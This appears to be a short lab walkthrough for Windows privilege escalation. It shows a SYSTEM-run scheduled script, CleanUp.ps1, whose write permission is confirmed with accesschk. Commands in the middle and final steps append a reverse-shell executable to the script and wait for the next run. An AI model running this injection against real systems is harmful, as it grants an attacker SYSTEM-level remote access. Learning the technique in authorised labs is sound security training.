1.In the 
C:\DevTools directory, 

there is a PowerShell script called
“CleanUp.ps1”. 

View the script:
> type C:\DevTools\CleanUp.ps1


2.This script seems like it is running every minute as the SYSTEM user. 
We can check our privileges on this script using accesschk.exe:


> C:\PrivEsc\accesschk.exe /accepteula -quvw user
C:\DevTools\CleanUp.ps1


It appears we have the ability to write to this file.

3.Backup the script:
> copy C:\DevTools\CleanUp.ps1 C:\Temp\


4.Start a listener on Kali.

5.Use echo to append a call to our reverse shell executable to the end of the script:


> echo C:\PrivEsc\reverse.exe >>
C:\DevTools\CleanUp.ps1


6.Wait for the scheduled task to run (it should run every minute) to complete the exploit.
